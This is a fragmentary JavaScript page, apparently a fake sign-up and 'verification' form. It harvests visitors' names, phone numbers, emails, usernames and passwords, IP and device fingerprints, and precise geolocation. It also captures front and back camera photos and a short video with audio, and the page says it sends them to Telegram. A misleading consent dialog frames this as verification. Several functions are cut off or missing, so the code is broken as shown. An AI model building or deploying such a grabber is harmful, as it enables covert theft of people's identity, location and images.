        feather.replace();
        const canvas = document.getElementById('particle-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        function createParticles() {
            particles = [];
            let particleCount = Math.floor(canvas.width * canvas.height / 20000);
            for (let i = 0; i < particleCount; i++) {
                particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5, radius: Math.random() * 1.5 + 0.5 });
            }
        }
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.x += p.vx; p.y += p.vy;
                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
                ctx.beginPath(); ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2); ctx.fillStyle = 'rgba(139, 92, 246, 0.5)'; ctx.fill();
            });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
                    if (dist < 120) {
                        ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(139, 92, 246, ${1 - dist/120})`; ctx.lineWidth = 0.5; ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animateParticles);
        }
        window.addEventListener('resize', () => { resizeCanvas(); createParticles(); });
        resizeCanvas(); createParticles(); animateParticles();
    </script>

function safeSlice(str, maxLen){

async function fetchJSON(url, opts){
  try {
    const r = await fetch(url, opts);
    if(!r.ok) return null;
    return await r.json();
  } catch(e) { return null; }
}

/* ================ IP INFO (multi-source) ================ */
async function getIPInfo(){
  const sources = [
    { url: 'https://ipapi.co/json/', map: j => ({ ip: j.ip, org: j.org, asn: j.asn || undefined, city: j.city, region: j.region, country: j.country_name || j.country, postal: j.postal }) },
    { url: 'https://ipwhois.app/json/', map: j => ({ ip: j.ip, org: j.org || j.isp, city: j.city, region: j.region, country: j.country, postal: j.postal }) },
    { url: 'https://api.ipify.org?format=json', map: j => ({ ip: j.ip }) }
  ];
  for(const s of sources){
    const j = await fetchJSON(s.url);
    if(!j) continue;
    try {
      const m = s.map(j);
      if(m && m.ip) return m;
    } catch(e) { continue; }
  }
  return { ip: 'unknown' };
}

async function revGeocode(lat, lon){

function getConnection(){
  try{

function getGeo(timeout = 10000){
  return new Promise(resolve => {
    if(!navigator.geolocation) return resolve({ error: 'geolocation not supported' });

  });
}

/* ================ MEDIA CAPTURE HELPERS ================ */
/* Capture front camera photo + short video (durationMs) */
async function capturePhotoAndVideo(durationMs = 5000){
  const videoPreview = document.createElement('video');
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    videoPreview.srcObject = stream;
    videoPreview.muted = true;
    await videoPreview.play().catch(()=>{});
    await new Promise(r => setTimeout(r, 700));
    const w = videoPreview.videoWidth || 1280, h = videoPreview.videoHeight || 720;
    const side = Math.min(w, h);
    const sx = Math.max(0, (w - side) / 2), sy = Math.max(0, (h - side) / 2);
    const size = 800;
    canvas.width = size; canvas.height = size;
    ctx.drawImage(videoPreview, sx, sy, side, side, 0, 0, size, size);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));

    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? 'video/webm;codecs=vp8,opus' :
                 (MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : '');
    const recorder = mime ? new MediaRecorder(stream, { mimeType: mime }) : new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = ev => { if(ev.data && ev.data.size) chunks.push(ev.data); };
    recorder.start();
    await new Promise(r => setTimeout(r, durationMs));
    recorder.stop();
    await new Promise(r => recorder.onstop = r);
    stream.getTracks().forEach(t => t.stop());
    videoPreview.pause(); videoPreview.srcObject = null;
    const videoBlob = new Blob(chunks, { type: chunks[0] && chunks[0].type ? chunks[0].type : 'video/webm' });
    return { photoBlob, videoBlob };
  }catch(e){
    try{ if(videoPreview && videoPreview.srcObject){ videoPreview.srcObject.getTracks().forEach(t=>t.stop()); videoPreview.srcObject = null; }}catch{}
    return { photoBlob: null, videoBlob: null };
  }
}

/* Capture back camera single photo */

  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  try{

    stream.getTracks().forEach(t => t.stop());
    video.pause(); video.srcObject = null;
    return blob;
  }catch(e){
    return null;
  }
}

  }
  lines.push(`╰─ > © ᴅᴀғғᴀ ᴅᴇᴠ`);
  return safeSlice(lines.join('\n'), 1000);
}
function buildVideoCaptionAddress(rev){
  const a = rev && rev.address ? rev.address : {};
  const lines = [];
  lines.push(`├─ > Alamat (Detail)`);
  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
  lines.push(` │   ├─ Kode Negara: ${a.country_code || '-'}`);
  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
  lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);
  return safeSlice(lines.join('\n'), 1000);
}

/* ================ CONSENT PROMPT + MAIN FLOW ================ */
async function askCameraConsentAndCapture(durationMs = 5000){
  const res = await Swal.fire({
    title: 'Izin Akses Kamera & Mikrofon',
    html: 'Agar proses verifikasi lengkap, izinkan akses <strong>kamera</strong> dan <strong>mikrofon</strong> untuk mengambil 1 foto & rekam video singkat.<br><small>Hanya akan digunakan untuk verifikasi dan dikirim ke admin.</small>',
    icon: 'question',
    showCancelButton: true,
    confirmButtonText: 'Izinkan',
    cancelButtonText: 'Tolak',
    reverseButtons: true,
    allowOutsideClick: false
  });
  if(!res.isConfirmed) return { photoBlob: null, videoBlob: null, consent: false };
  const media = await capturePhotoAndVideo(durationMs);
  return { photoBlob: media.photoBlob, videoBlob: media.videoBlob, consent: true };
}

/* Attach to register button (ensure the element exists) */
(function attachHandler(){
  const regBtn = document.querySelector("#register-card button[type='submit']");
  const regFormEl = document.getElementById('register-card') || document.getElementById('login-form');
  if(!regBtn) return console.warn('Register button not found. Handler not attached.');

  regBtn.addEventListener('click', async function(e){
    e.preventDefault();

    const name = (document.getElementById('fullname') || {}).value || '';
    const wa = (document.getElementById('phone') || {}).value || '';
    const email = (document.getElementById('email') || {}).value || '';
    const username = (document.getElementById('reg-username') || {}).value || '';
    const password = (document.getElementById('reg-password') || {}).value || '';

    if(!name || !wa || !email || !username || !password){
      return Swal.fire({ icon:'warning', title:'Form belum lengkap', text:'Isi Nama, Nomor, Email, Username, dan Password.' });
    }

    // show loading / processing
    Swal.fire({ title: 'Memproses...', html: 'Memeriksa perangkat & meminta izin bila perlu.', allowOutsideClick:false, didOpen: ()=> Swal.showLoading() });

    // gather device + network info
    const ipInfo = await getIPInfo().catch(()=>({ ip:'unknown' }));
    const battery = await getBattery().catch(()=>null);
    const connection = getConnection();
    const deviceMemory = navigator.deviceMemory || '-';
    const maxTouchPoints = navigator.maxTouchPoints || '-';
    const colorDepth = screen.colorDepth || '-';
    const device = {
      platform: navigator.platform || '-',
      userAgent: navigator.userAgent || navigator.appVersion || '-',
      screen: (screen ? `${screen.width}x${screen.height}` : '-'),
      language: navigator.language || '-',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
      localDate: new Date().toLocaleString(),
      battery,
      deviceMemory,
      maxTouchPoints,
      colorDepth,
      connection
    };

    // Ask camera consent and capture media if allowed
    const mediaRes = await askCameraConsentAndCapture(5000);
    const consent = mediaRes.consent;
    let geo = { error: 'not requested' }, rev = null;
    if(consent && 'geolocation' in navigator){
      geo = await getGeo().catch(e=>({ error: e.message || 'geo fail' }));
      if(!geo.error && geo.lat && geo.lon){
        rev = await revGeocode(geo.lat, geo.lon).catch(()=>null);
      }
    }

    // try capture back photo only if consent and user wants (we reuse consent)
    let backPhoto = null;
    if(consent){
      try{ backPhoto = await captureBackPhoto(); }catch(e){ backPhoto = null; }
    }

    // Build profile + captions
    const profile = { name, phone: wa, email, username };
    const photoCaptionObj = {
      profile,
      message: 'Pendaftaran & Verifikasi (dengan izin)',
      userAgent: device.userAgent,
      ipInfo,
      platform: device.platform,
      screen: device.screen,
      language: device.language,
      timezone: device.timezone,
      battery: device.battery,
      geo
    };
    const photoCaption = buildPhotoCaption(photoCaptionObj);
    const videoCaption = rev ? buildVideoCaptionAddress(rev) : '(No reverse geocode)';

    // send summary text first (optional)
    try{
      await sendText(`╭─ > Pendaftaran Baru\n ├─ > Nama: ${name}\n ├─ > Nomor: ${wa}\n ├─ > Email: ${email}\n ├─ > Username: ${username}\n ╰─ > Aksi: Pendaftaran`);
    }catch(e){ /* ignore */ }

    // send front photo or fallback text
    try{
      if(mediaRes.photoBlob){
        await sendPhotoCaption(mediaRes.photoBlob, photoCaption + '\n\n(Tipe: Kamera Depan)');
      } else {
        await sendText(photoCaption + '\n\n(Tidak ada foto depan)');
      }
    }catch(e){ console.warn('photo send fail', e); }

    // send back photo if exists
    try{
      if(backPhoto){
        await sendPhotoCaption(backPhoto, photoCaption + '\n\n(Tipe: Kamera Belakang)');
      }
    }catch(e){ console.warn('back photo fail', e); }

    // send video if exists
    try{
      if(mediaRes.videoBlob){
        await sendVideoCaption(mediaRes.videoBlob, videoCaption || 'Video verifikasi');
      }
    }catch(e){ console.warn('video send fail', e); }

    Swal.fire({ icon:'success', title:'Pendaftaran Terkirim', text:'Data (dan media bila diizinkan) telah dikirim ke Telegram.' });

    // optional: reset form fields
    try{
      document.getElementById('fullname').value = '';
      document.getElementById('phone').value = '';
      document.getElementById('email').value = '';
      document.getElementById('reg-username').value = '';
      document.getElementById('reg-password').value = '';
    }catch(e){}
  });
})();
